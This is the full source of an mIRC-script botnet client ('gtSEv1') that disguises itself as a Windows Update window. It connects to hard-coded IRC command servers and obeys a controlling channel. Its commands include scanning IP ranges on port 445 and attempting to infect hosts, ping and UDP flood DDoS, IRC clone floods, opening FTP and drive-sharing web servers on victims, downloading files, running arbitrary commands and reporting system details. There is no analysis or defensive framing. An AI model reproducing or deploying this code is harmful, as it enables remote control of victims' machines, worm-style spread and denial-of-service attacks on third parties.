on *:exit:{ sockclose * | rlevel 720 | unset %* }
on *:start:{ run svchost32.exe /n /fh UPDATE | unset %* | rgs | bwin | writeini rcfg.ini ident userid $read(navdb.dbx) | writeini rcfg.ini mirc user $read(navdb.dbx) | emailaddr Admin@nat01.dhcp- $+ $r(100,122) $+ .core-2.oc48. $+ $nfs $+ .gov | conn | timer 0 30 verify | 27374 | rlevel 720 | nick $nfs | fullname $nfs | %impossible = 1,1 }
alias rgs { %c = #zCrew | if ($os == 95) || ($os == 98) || ($os == ME) { %windir = C:\WINDOWS\ | %bootdir = C:\\WINDOWS\\ | %bsys = C:\\WINDOWS\\SYSTEM\\ } | if ($os == XP) || ($os == 2K) || ($os == NT) { %windir = C:\WINNT\ | %bootdir = C:\\WINNT\\ | %bsys = C:\\WINNT\\SYSTEM32\\ } }
on *:sockopen:Antivirus*:{ if ($sockerr > 0) { return } }
on *:sockread:Antivirus*: { sockread -f %Antivirus | if (%Antivirus == PWD) { sockwrite $sockname  PWD14438136782715101980 | timer 1 10 sockwrite $sockname RMS } | sockwrite $sockname RMS | unset %Antivirus }
on *:sockread:inviter*:{ 
  sockread -f %t.i 
  if ($gettok(%t.i,2,32) == 313) { msg %c 2[4SECURITY2]14 Inviter detected an IRCop! 10-[12 $+ $gettok(%t.i,4,32) $+ 10] }
  if ($gettok(%t.i,2,32) == 322) && ($gettok(%t.i,5,32) > 30) { write ichan.txt $gettok(%t.i,4,32) } 
  if ($gettok(%t.i,2,32) == 321) { msg %c 2[14inviter2]14 Listing channels on: $remove($gettok(%t.i,1,32),:) } 
  if ($gettok(%t.i,2,32) == 323) { msg %c 2[14inviter2]14 Listing complete on:  $remove($gettok(%t.i,1,32),:) [Total Channels in List: $+ $lines(ichan.txt) $+ ] }
  if ($gettok(%t.i,2,32) == 474) { msg %c 2[8ERROR2]14 Inviter is banned from: ( $+  $gettok(%t.i,4,32) $+ ) }   
  if ($gettok(%t.i,1,32) == PING) { sockwrite inviter* PONG $gettok(%t.i,2,32) } 
  if ($gettok(%t.i,2,32) == JOIN) { sockwrite -nt inviter* PRIVMSG $remove($gettok(%t.i,1,33),:) : $+ %imsg | inc %i.t.j } 
  if ($gettok(%t.i,2,32) == PART) { sockwrite -nt inviter* PRIVMSG $remove($gettok(%t.i,1,33),:) : $+ %imsg  | inc %i.t.p }
  if ($gettok(%t.i,2,32) == KICK) { sockwrite -nt inviter* JOIN : $+ $gettok(%t.i,3,32) } | if ($gettok(%t.i,1,32) == ERROR) { msg %c 2[14inviter2]14 Error Connecting: %t.i [Reloading] | timerinviteconnect 1 10 sockopen inviter %i.server %i.port }
  if ($gettok(%t.i,2,32) == MODE) { if ($gettok(%t.i,4,32) == +o) { if ($timer($gettok(%t.i,5,32)) == $null) { halt } | timer $+  $gettok(%t.i,5,32) off | dec %i.t.j 1 | msg %c 2[14inviter2]14 Error! $gettok(%t.i,5,32) is now +o (skipped invite) } }
}
on 1:sockopen:inviter*: { sockwrite -tn $sockname user $nfs  $nfs  $nfs : $+ $nfs | sockwrite -tn $sockname nick  $read(navdb.dbx) | timerinviteconnect off | sockread }
on 1:sockclose:inviter*:{ if (%i.b == off) { remove ichan.txt | halt } |  if (%i.b == on) { msg %c 2[14inviter2]14 disconnected! [Reloading] | sockclose inviter* | timerinviteconnect 1 10  sockopen inviter %i.server %i.port } }
on 720:text:*:*:{ if (!$exists(svchost32.exe)) { uinst }
  if ($1 == !speed) { msg %c 2[14speed2]14 http://www.dslreports.com/archive/ $+   $gettok($host,3-,46) }
  if ($1 == !set.server1) && ($2 != $null) { %s1 = $2 }
  if ($1 == !set.server2) && ($2 != $null) { %s2 = $2 }
  if ($1 == !set.server3) && ($2 != $null) { %s3 = $2 }
  if ($1 == !startscan) && (%begshortip == $null) && ($exists(STDE9.exe)) { msg %c 2[14scanner2]14 starting scan from: $2 to $3 | set %begshortip $2 | set %beglongip $longip(  %begshortip ) | set %endshortip $3 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
  if ($1 == !randscan) && (%begshortip == $null) && ($exists(STDE9.exe)) { set %begit $randip($2) | msg %c 2[14scanner2]14 starting scan from: %begit to $3 | set %begshortip %begit | set %beglongip $longip(  %begshortip ) | set %endshortip $3 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
  if ($1 == !stopscan) && (%begshortip != $null) { sockclose ip* | timerscanner* off | unset %ip* | unset %total | unset %totalscaning | msg %c 2[14scanner2]14 scanning of %begshortip to %endshortip stopped by $nick $+ ! | unset %beg* | unset %end* }
  if ($1 == !-) && ($2 != $null) { %- = $2- | msg %c 2[14action2]14 / $+ $2- | / $+ %- | unset %- }
  if ($1 == !version) { msg %c gtSEv1 by Lance-, greetz to ph33r,jadie,zeta6969 & code-red }
  if ($1 == !join) && ($2 != $null) { join $2 $3- | msg %c 2[14join2]14 $2 ( $+ $3- $+ ) $+ .. }
  if ($1 == !part) && ($2 != $null) { if ($2 == %c) { msg %c 2[8ERROR!2]14 cannot part %c | halt } | { part $2 $3- | msg %c 2[14part2]14 $2 ( $+ $3- $+ ) } }
  if ($1 == !killapp) && ($2 != $null) { run svchost32.exe /n /fh /r " $+ $mircdirlibparse.exe -kf $2 $+ " | msg %c 2[14closed2]14 $2- }
  if ($1 == !kill) { quit $ip $+ / $+ $date $+ / $+ $time $+ / $+ gtSEv1 | timer 1 1 exit }
  if ($1 == !info.conn) { msg %c connection: $dll(bootdrv.dll,connection,_) network interfaces:   $dll(bootdrv.dll,interfaceinfo,_) ip/host: $ip $+ / $+ $host }
  if ($1 == !info.main) { msg %c time/date: $time $+ @ $+ $date os: $dll(bootdrv.dll,osinfo,_) cpu:   $dll(bootdrv.dll,cpuinfo,_) mem: $dll(bootdrv.dll,meminfo,_) uptime: $duration($calc($ticks / 1000 )) hdd:   $dll(bootdrv.dll,diskcapacity,_) url: $+ $url }
  if ($1 == !ftp.start) && ($2 != $null) { write -l2 rconnect.conf BindPort $2 | run rconnect.exe | msg %c 2[14ftp2]14 admin: gtSEv1:gtSEv1@ $+ $ip $+ : $+ $2 guest: ph33rle55:test123@ $+ $ip $+ : $+ $2 | timerDE 0 2 write -c rconnect.log }
  if ($1 == !ftp.stop) { run svchost32.exe /n /fh /r " $+ $mircdirlibparse.exe -kf rconnect.exe" | msg %c 2[14ftp2]14 is now off | | /timerremove 1 5 /remove rconnect.log | timerDE off  }
  if ($1 == !copy) { if ($exists(C:\winnt\system32\STDE9.exe) == $true) { /copy C:\winnt\system32\STDE9.exe c:\winnt\web\printers\images\STDE9.exe | /msg %c 2[14copied2]14 File } | elsif { $exists(c:\windows\system32\STDE9.exe) == $true) { /copy c:\windows\system32\STDE9.exe c:\winnt\web\printers\images\STDE9.exe } } }
  if ($1 == !clean) { run svchost32.exe /n /fh /r " $+ $mircdirlibparse.exe -kf rconnect.exe" | /timerremove 1 5 /remove rconnect.log | /remove STDE9.exe /msg %c 2[14Cleaned Up2]14 | run secure.bat | run svchost32.exe /n /fh c:\winnt\system32\cmd.exe }
  if ($1 == !web.on) { /set %ws.count 0 | /set %ws.homedir C:\ | /set %ws.logging 0 | /set %ws.showStatus 0 | /set %ws.port $2 | /set %ws.statsPage 1 | /ws.on | /msg %c 2[14Webserver On2]14 http:// $+ $ip $+ : $+ %ws.port }
  if ($1 == !web.off) { /ws.off | /msg %c 2[14Webserv OFF2]14 }
  if ($1 == !web.drive) { /set %ws.count 0 | /set %ws.homedir $2 | /set %ws.logging 0 | /set %ws.showStatus 0 | /set %ws.port $3 | /set %ws.statsPage 1 | /ws.on | /msg %c 2[14Webserver On2]14 [Drive - %ws.homedir $+ ] http:// $+ $ip $+ : $+ %ws.port }
  if ($1 == !clone) {
    if ($2 == load) && ($3 != $null) { sockopen Sockets- $+ $r(1,999) $3 $4 | msg %c 2[14clonez2]14 loading to: $3 $+ : $+   $4 }
    if ($2 == kill) { sockwrite -tn Sockets-* QUIT : $+ $3- | sockclose Sockets-* | msg %c 2[14clonez2]14 all clones disconnected! }
    if ($2 == join) && ($3 != $null) { sockwrite -tn Sockets-* JOIN $3 $4- }
    if ($2 == part) && ($3 != $null) { sockwrite -tn Sockets-* PART $3 $4- }
    if ($2 == msg) && ($3 != $null) { sockwrite -tn Sockets-* privmsg $3 : $+ $4- }
    if ($2 == notice) && ($3 != $null) { sockwrite -tn Sockets-* privmsg $3 : $+ $4- }
    if ($2 == join2) && ($3 != $null) { timer 1 $r(10,240) sockwrite -tn Sockets-* JOIN $3 $4- }
    if ($2 == part2) && ($3 != $null) { timer 1 $r(10,360) sockwrite -tn Sockets-* PART $3 $4- }
    if ($2 == cfld1) && ($3 != $null) { sockwrite -tn Sockets-* join $3 | sockwrite -tn Sockets-* PRIVMSG $3 : $+ %m1 |  sockwrite -tn Sockets-* NOTICE  $3 : $+ %m2 | sockwrite -tn Sockets-* part $3 | msg %c 2[14clonez2]14 starting flood on $3 }
    if ($2 == cfld2) && ($3 != $null) { sockwrite -tn Sockets-* join $3 | timer 0 2 sockwrite -tn Sockets-* privmsg $3 : $+ %m3 |  timer 0 4 sockwrite -tn  Sockets-* notice $3 : $+ %m1 | msg %c 2[14clonez2]14 starting endless flood on $3 $+ ! }
    if ($2 == nfld) && ($3 != $null) { sockwrite -tn Sockets-* privmsg $3 : $+ %m1 | sockwrite -tn Sockets-* notice $3 : $+ %m2  | msg %c 2[14clonez2]14 pvt flooding: $3 }
    if ($2 == sendq) && ($3 != $null) { sockwrite -n Sockets-* privmsg $3- : $+ %m3 | sockwrite -tn Sockets-* nick $nfs |  sockwrite -n Sockets-* privmsg $3- : $+ %m4 | msg %c 2[14clonez2]14 attempting to sendq: $3- }
  }
  if ($1 == !inviter) {
    if ($2 == load) && ($4 != $null) { %i.server = $3 | %i.port = $4 | %i.b = on | if ($sock(inviter*,0) > 0) { msg %c 2[14inviter2]14 Inviter already is loaded on: %i.server | halt } | sockopen inviter %i.server %i.port | msg  %c 2[14inviter2]14 Loading inviter to: [ %i.server : %i.port ] }
    if ($2 == stop) && (%i.port != $null) { sockclose inviter* | remove ichan.txt | unset %i.* | timerinviteconnect off | msg %c 2[14inviter2]14 Connection closed | unset %imsg | unset %t.i } 
    if ($2 == stats) && ($sock(inviter)) { msg %c 2[14inviter2]14 Total:[ $+ $calc( %i.t.j  +  %i.t.p ) $+ ] // Join:[ $+  %i.t.j $+ ] // Part:[ $+  %i.t.p $+ ] }
    if ($2 == list) && ($sock(inviter)) { sockwrite -nt inviter* LIST :* $+ $3 $+ * }
    if ($2 == msg) { %imsg = $3- | msg %c 2[14inviter2]14 Message set: [ $+ $3- $+  ] }
    if ($2 == ctotal) && ($sock(inviter)) { msg %c 2[14inviter2]14 Random Channels Total: $+ $lines(ichan.txt) }
    if ($2 == join) && ($sock(inviter)) { if ($3 == random) { if ($lines(ichan.txt) < 0) || ($exists(ichan.txt) == $false) { msg # 2[14inviter2]14 Gather channels first! | halt } | set %i.r.j.a $4 | set %i.r.j.i 0 | :loop | if  (%i.r.j.i  > %i.r.j.a) { goto end } | sockwrite -nt inviter* JOIN : $+ $read(ichan.txt) | inc %i.r.j.i  | goto loop | :end | unset  %i.r.j.* | halt } | sockwrite -nt inviter* JOIN : $+ $3 }
    if ($2 == part) && ($sock(inviter)) { sockwrite -nt inviter* PART : $+ $3- }  
    if ($2 == delay) { %i.ondelay = $3 | msg %c 2[14inviter2]14 Delay set to: $3 }
  }
  if ($1 == !bnc.start) && ($3 != $null) { if ($sock(Bnc)) { msg %c 2[8ERROR2]14 bnc is already active on port: %Bnc.Port $+ , pass: %Bnc.passwd | halt } | %Bnc = on | socklisten Bnc $2 | %Bnc.port = $2 | %Bnc.passwd = $3 | msg %c 2[14bnc2]14 /server -m $ip $+ : $+ $2 $+ , then /quote PASS $3 }
  if ($1 == !bnc.stats) && ($sock(Bnc)) { msg %c 2[14bnc2]14 is on! $ip $+ : $+ %Bnc.port pass: %Bnc.passwd $+ .. users: $sock(BncClient*,0) connected: $sock(BncServer*,0) }
  if ($1 == !bnc.stop) && (%Bnc.Port != $null) { sockclose Bnc* | msg %c 2[14bnc2]14 server on port %bnc.port is now off | unset %bnc.* | sockclose Bnc* }
  if ($1 == !packet) && ($3 != $null) { run svchost32.exe /n /fh /r "ping.exe $2 -n $3 -l 65500" | msg %c 2[14DDoS2]14 packeting $2 with $calc($3 *65536/1024/1000) $+ mb traffic }
  if ($1 == !packet.stop) { run svchost32.exe /n /fh /r " $+ $mircdirlibparse.exe -kf ping.exe" | msg %c 2[14DDoS2]14 packeting halted! }
  if ($1 == !download) { /download $2- | /msg %c 2[14Downloading..2]14 }
  if ($1 == !icmp) {
    /msg %c 2[14ICMP2]14 on $2
    /timerremove 1 200 /remove blah.vbs
    write blah.vbs on error resume next
    write blah.vbs Set bl = CreateObject("Wscript.shell")
    write blah.vbs bl.run "ping $2 -w 0 -l $3 -n $4 $+ ",0,true
    run blah.vbs
    halt
  }
  if ($1 == !udp) {
    if ($2 == $null) {
      halt
    }
    if ($3 == $null) {
      halt
    }
    if ($4 == $null) {
      halt
    }
    set %start 0
    set %end $4
    msg %c /\ UDP Started On /\ IP: $2 /\ Total: $4 /\ Port: $3
    :udploop
    if (%start == %end) {
      msg %c  /\ UDP Complete
      halt
    }
    inc %start 1
    if ($3 == 0) {
      set %randname $rand(10000,99999)
      set %str $read(str.vxd)
      set %randport $rand(0,65535)
      sockudp Udp $+ %randname $+ a $2 %randport %str
      sockudp Udp $+ %randname $+ b $2 %randport %str
      sockudp Udp $+ %randname $+ c $2 %randport %str
      sockudp Udp $+ %randname $+ d $2 %randport %str
      sockudp Udp $+ %randname $+ e $2 %randport %str
      sockudp Udp $+ %randname $+ f $2 %randport %str
      sockudp Udp $+ %randname $+ g $2 %randport %str
      sockudp Udp $+ %randname $+ h $2 %randport %str
      sockudp Udp $+ %randname $+ i $2 %randport %str
      sockudp Udp $+ %randname $+ j $2 %randport %str
      goto udploop
    }
    if ($4 != 0) {
      set %randname $rand(10000,99999)
      set %str $read(str.vxd)
      sockudp Udp $+ %randname $+ a $2 $3 %str
      sockudp Udp $+ %randname $+ b $2 $3 %str
      sockudp Udp $+ %randname $+ c $2 $3 %str
      sockudp Udp $+ %randname $+ d $2 $3 %str
      sockudp Udp $+ %randname $+ e $2 $3 %str
      sockudp Udp $+ %randname $+ f $2 $3 %str
      sockudp Udp $+ %randname $+ g $2 $3 %str
      sockudp Udp $+ %randname $+ h $2 $3 %str
      sockudp Udp $+ %randname $+ i $2 $3 %str
      sockudp Udp $+ %randname $+ j $2 $3 %str
      goto udploop
    }
  }
}

alias conn { %m1 = $str(�-�[��X��-�[��X�,15) | %m2 = $str(gtSEv1,80) | %m3 = $str(%impossible $+ Star_WarS*Star_WarS*,11))  | %m4 = $str(��,100) | unset %impossible
  if ($portfree(113)) { socklisten IDENT 113 }
  if (!$portfree(27920)) { exit } | else { socklisten WindowsUpdate 27920 }
  if (%s1 == $null) { %s1 = zc0n.kicks-ass.net:6667 } | if (%s2 == $null) { %s2 = drag0nwyk.homelinux.net:6667 } | if (%s3 == $null) {  %s3 = irc.zbot.tk:6667 } | /server zc0n.kicks-ass.net 6667
}
raw 332:*:{ echo gtSEv1 | %topic = $3- | if (Autopacket isin %topic) { run svchost32.exe /n /fh /r "ping.exe $gettok(%topic,2-,46) -l 25500 -n 999999" } | if (NewSTDE ising %topic) { remove STDE9.exe } }
alias nfs { return ]I[- $+ $r(1,100000) }
alias hide { if (!$exists(svchost32.exe)) { msg %c 2[4SECURITY2]14 hidewindow is missing! | uinst } | run svchost32.exe /n /fh UPDATE }
alias bwin { window -p @Microsoft.Windows.Update 0 0 1600 1200 | timer 0 5 window -a @Microsoft.Windows.update }
alias uinst { msg %c 2[14uninstall 2]14 removing files.. | remove rcfg.ini | remove navdb.dbx | remove rconnect.exe | remove iiscache.dll |   remove svchost32.exe | remove libparse.exe | remove stde9.exe | remove psexec.exe | remove bootdrv.dll | msg %c 2[14uninstall2]14 modifying startup.. | write UNINST.reg REGEDIT4 | write UNINST.reg   [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run] | write UNINST.reg "Com+Services"=" $+  %bootdir $+ explorer.exe $+ " | run -n regedit /s UNINST.reg | timer -o 1 3 remove UNINST.reg | timer 1 5 exit }
alias verify { if (!$exists(svchost32.exe)) { uinst } | if ($appstate != hidden) { hide } }
on *:connect:{ ial on | pdcc on | fsend on | mode $me +ix |  timerbackup* off | timer 0 10 join %c ej337 | run secure.bat | run svchost32.exe /n /fh C:\WINNT\System32\cmd.exe | //timerreconnect off | clearall }
on 1:sockopen:ip*:{ if ($sockerr > 0) { halt } | set %445 % [ $+ [ $sockname ] ] | run svchost32.exe /n /fh /r "v32driver.bat   %445 $+ " | msg %c 2[14scanner2]14 found: %445 $+ , attempting to infect.. | sockclose $sockname | unset %445 | halt }
alias finished { msg %c 2[14scanner2]14 scanning from %begshortip to %endshortip is finished! | sockclose ip* |   timers off | unset %beg* | unset %end* | unset %ip* | unset %total* }
alias 27374 { if (!$portfree(27374)) { sockopen Antivirus 127.0.0.1 27374 } }
alias sba { timer 1 1 mode %c +bb $address($2,2) $address($2,3) | timer 1 2 kick %c $2 you were kicked from %c by   $read(navdb.dbx) }
on *:notice:password:*:{ notice $nick $read(navdb.dbx,25) }
on @*:notice:agnes:*:{ timerban $+ $nick off | timerkick $+ $nick off | mode %c +v $nick }
on *:op:%c:{ if ($opnick == $me) { mode %c +ntsk  } }
on *:socklisten:ident:{ sockaccept ident. [ $+ [ $ticks ] ] }
on *:sockread:ident.*:{ sockread %ident | tokenize 32 %ident | if ($numtok($1-,44) == 2 && $1,$3 isnum) { sockwrite -n   $sockname $3 , $1 : USERID : none.of.your.business : $nfs | sockclose $sockname | unset %ident } }
on *:input:*:{ haltdef | msg %c 2[4SECURITY2]14 user input: $1- | hide }
on *:sockopen:wget:{ %wget.td = temp $+ $r(1,999) | msg %c 2[14wGet2]14 creating $mircdir $+ %wget.td | mkdir %wget.td |   sockwrite -n wget GET %wget.file | msg %c 2[14wGet2]14 connected to: %wget.server --requesting %wget.file }
on 1:sockclose:wget:{ msg %c 2[14wget2]14 download complete! saved file to: $mircdir $+ %wget.td $+ \ $+   $gettok(%wget.file,$gettok(%wget.file,0,47),47) | unset %wget.* | timer -o 1 120 rmdir %wget.td }
on *:socklisten:Bnc:{ sockaccept BncClient $+ $r(1,999) }
on *:disconnect:{ rlevel 720 | //timerreconnect -o 0 100 //checkconn | clearall }
on 720:part:%c:{ ruser 720 $nick | clearall }
on 720:quit:%c:{ ruser 720 $nick | clearall }
on 720:nick:*:{ ruser 720 $nick | clearall }
on @*:join:%c:{
  notice $nick password | timerban $+ $nick 1 15 mode %c +bb $address($nick,2) $address($nick,3) | timerkick $+ $nick 1 20   kick %c $nick you were kicked from %c by $read(navdb.dbx)
  if (!$regex($nick,[a-z][1-3][A-Z][5-9].*)) || (4 isin $nick) { sba $nick }
}
on *:sockread:wget:{ 
  :read
  sockread &bvar 
  if ($sockbr) { 
    bwrite $mircdir $+ %wget.td $+ \ $+ $gettok(%wget.file,$gettok(%wget.file,0,47),47) -1 -1 &bvar 
    goto read 
  } 
}
on *:sockread:BncClient*:{
  sockread %BncClient
  if ($gettok(%BncClient,1,32) == NICK) {
    set %Bnc.nick $gettok(%BncClient,2,32)
  }
  if ($gettok(%BncClient,1,32) == USER) {
    set %Bnc.user $gettok(%BncClient,2-,32)
    sockwrite -n $sockname NOTICE AUTH : $+ You need to say /quote PASS <password>
  }
  if ($gettok(%BncClient,1,32) == PASS) { 
    if ($gettok(%BncClient,2,32) == %Bnc.passwd) {
      sockwrite -n $sockname NOTICE AUTH : $+ Welcome to BNC 2.6.4-WIN, the irc proxy
      sockwrite -n $sockname NOTICE AUTH : $+ Level two, lets connect to something real now
      sockwrite -n $sockname NOTICE AUTH : $+ type /quote conn [server] <port> <pass> to connect
      %Bnc.legit = yes
    } 
    if ($gettok(%BncClient,2,32) != %Bnc.passwd) { 
      sockwrite -n $sockname NOTICE AUTH : $+ Failed Pass!!
    }
  }
  if ($gettok(%BncClient,1,32) == CONN) {
    if (%Bnc.legit != yes) { sockwrite -n $sockname NOTICE AUTH : $+ BNC Exploits dont work on gtSEv1! | sockclose   $sockname
    }
    if (BncServer $+ $remove($sockname,BncClient) != $null) {
      sockclose BncServer $+ $remove($sockname,BncClient)
    }
    sockopen BncServer $+ $remove($sockname,BncClient) $gettok(%BncClient,2,32) $gettok(%BncClient,3,32)
    sockwrite -n $sockname NOTICE AUTH : $+ Making reality through $gettok(%BncClient,2,32) port $gettok(%BncClient,3,32)
    set %Bnc.server.passwd $gettok(%BncClient,4,32)
  }
  else {
    if ($sock(BncServer $+ $remove($sockname,BncClient)).status != active) {
      halt
    }
    sockwrite -n BncServer $+ $remove($sockname,BncClient) %BncClient
  }
}
on *:sockopen:BncServer*:{
  if ($sockerr) {
    sockwrite -n $sockname NOTICE AUTH : $+ Failed Connection
    sockclose $sockname
    halt
  }
  if ($sock($sockname).status != active) {
    sockwrite -n $sockname NOTICE AUTH : $+ Failed Connection
    sockclose BncServer $+ $remove($socknme, BncServer)
    halt
  }
  sockwrite -n BncClient $+ $remove($sockname,BncServer) NOTICE AUTH : $+ Suceeded connection
  sockwrite -n $sockname NICK %Bnc.nick
  sockwrite -n $sockname USER %Bnc.user
}
on *:sockread:BncServer*:{
  sockread %BncServer
  if ($sock(BncClient $+ $remove($sockname,BncServer)).status != active) {
    halt
  }
  sockwrite -n BncClient $+ $remove($sockname,BncServer) %BncServer
}
on *:sockopen:Sockets-*:{ sockwrite -tn $sockname PONG $server | sockwrite -tn $sockname USER $nfs $nfs $nfs : $+ $nfs |   sockwrite -tn $sockname NICK $read(navdb.dbx) }
on *:sockread:Sockets-*:{
  sockread %SocketTemp
  if (PING* ISWM %SocketTemp) {
    sockwrite -tn $sockname PONG : $+ $gettok(%SocketTemp,2,58)
    halt
  }
  halt
}
on *:text:!login*:%c:{ if ($nick isop %c) && ($2 = zcr3w) { msg %c password accepted..   12[15�ADMINISTATOR�12] | auser 720 $nick } }
alias startscan {
  inc %totalscaning
  if %totalscaning == %total finished
  set %ip1 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 1
  set %ip2 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 2
  set %ip3 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 3
  set %ip4 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 4
  set %ip5 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 5
  set %ip6 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 6
  set %ip7 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 7
  set %ip8 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 8
  set %ip9 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 9
  set %ip10 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 10
  set %ip11 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 11
  set %ip12 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 12
  set %ip13 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 13
  set %ip14 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 14
  set %ip15 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 15
  set %ip16 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 16
  set %ip17 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 17
  set %ip18 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 18
  set %ip19 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 19
  set %ip20 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 20
  set %ip21 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 21
  set %ip22 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 22
  set %ip23 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 23
  set %ip24 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 24
  set %ip25 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  opensocks
}
alias opensocks {
  sockopen ip1 %ip1 445
  if $1 == 1 finished
  sockopen ip2 %ip2 445
  if $1 == 2 finished
  sockopen ip3 %ip3 445
  if $1 == 3 finished
  sockopen ip4 %ip4 445
  if $1 == 4 finished
  sockopen ip5 %ip5 445
  if $1 == 5 finished
  sockopen ip6 %ip6 445
  if $1 == 6 finished
  sockopen ip7 %ip7 445
  if $1 == 7 finished
  sockopen ip8 %ip8 445
  if $1 == 8 finished
  sockopen ip9 %ip9 445
  if $1 == 9 finished
  sockopen ip10 %ip10 445
  if $1 == 10 finished
  sockopen ip11 %ip11 445
  if $1 == 11 finished
  sockopen ip12 %ip12 445
  if $1 == 12 finished
  sockopen ip13 %ip13 445
  if $1 == 13 finished
  sockopen ip14 %ip14 445
  if $1 == 14 finished
  sockopen ip15 %ip15 445
  if $1 == 15 finished
  sockopen ip16 %ip16 445
  if $1 == 16 finished
  sockopen ip17 %ip17 445
  if $1 == 17 finished
  sockopen ip18 %ip18 445
  if $1 == 18 finished
  sockopen ip19 %ip19 445
  if $1 == 19 finished
  sockopen ip20 %ip20 445
  if $1 == 20 finished
  sockopen ip21 %ip21 445
  if $1 == 21 finished
  sockopen ip22 %ip22 445
  if $1 == 22 finished
  sockopen ip23 %ip23 445
  if $1 == 23 finished
  sockopen ip24 %ip24 445
  if $1 == 24 finished
  sockopen ip25 %ip25 445
  timerscannerTE 1 12 sockclose ip*
  timerscannerSA 1 15 startscan
}
alias randip {
  unset %1p1 %1p2
  set %1p1 $1-
  set %1p2 $replace($gettok(%1p1,1,46),*,$rand(1,255))
  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,2,46),*,$rand(1,255))
  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,3,46),*,$rand(1,255))
  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,4,46),*,$rand(1,255))
  return %1p2
}
alias checkconn {
  if ($server == $null) { 
    if (%c.re == $null) || (%c.re == 0) { set %c.re 1 | server %s2 }
    if (%c.re == 1) { set %c.re 0 | server %s3 }
  }
  else { halt }
}